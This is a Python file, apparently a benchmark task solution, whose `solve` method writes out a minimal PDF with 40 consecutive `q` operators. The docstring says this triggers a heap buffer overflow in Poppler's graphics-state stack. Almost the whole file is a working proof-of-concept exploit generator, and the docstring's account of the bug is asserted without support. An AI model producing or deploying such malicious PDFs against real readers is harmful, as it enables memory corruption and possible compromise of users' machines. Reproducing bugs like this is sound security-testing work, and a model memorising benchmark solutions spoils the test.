import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in Poppler's GfxState handling.
        The `GfxState` object maintains a stack of previous states to handle nested
        graphics state transformations, such as those initiated by the PDF `q` (save)
        and `Q` (restore) operators.

        This stack (`stateStack`) has a fixed size of 32 (`gfxStateStackSize`).
        The `GfxState::save()` method, called when a `q` operator is processed,
        pushes the current state pointer onto this stack without checking if the
        stack is full.

        By creating a PDF with a content stream containing more than 32 `q` operators
        in a row, we can cause `GfxState::save()` to be called repeatedly. This leads
        to an out-of-bounds write on the heap-allocated `GfxState` object, overflowing
        the `stateStack` array.

        This PoC constructs a minimal valid PDF with a content stream containing
        40 `q` operators, which is sufficient to trigger the overflow.
        """
        
        # Using 40 'q' operators, which is greater than the stack size of 32.
        payload = b"q " * 40

        # Construct a minimal PDF structure
        obj1_catalog = b"<< /Type /Catalog /Pages 2 0 R >>"
        obj2_pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        obj3_page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>"
        obj4_stream = b"<< /Length %d >>\nstream\n%s\nendstream" % (len(payload), payload)

        objects = [
            obj1_catalog,
            obj2_pages,
            obj3_page,
            obj4_stream
        ]

        pdf_body_parts = [b"%PDF-1.7\n"]
        offsets = []
        
        current_offset = len(pdf_body_parts[0])
        for i, obj_content in enumerate(objects):
            offsets.append(current_offset)
            obj_str = b"%d 0 obj\n%s\nendobj\n" % (i + 1, obj_content)
            pdf_body_parts.append(obj_str)
            current_offset += len(obj_str)
        
        body = b"".join(pdf_body_parts)

        xref_offset = len(body)
        num_objects = len(objects) + 1
        
        xref_parts = [f"xref\n0 {num_objects}\n".encode('ascii')]
        xref_parts.append(b"0000000000 65535 f \n")
        for offset in offsets:
            xref_parts.append(f"{offset:010d} 00000 n \n".encode('ascii'))
        
        xref_table = b"".join(xref_parts)

        trailer = f"trailer\n<< /Size {num_objects} /Root 1 0 R >>\n".encode('ascii')
        
        startxref = f"startxref\n{xref_offset}\n".encode('ascii')
        eof = b"%%EOF"

        poc = body + xref_table + trailer + startxref + eof
        
        return poc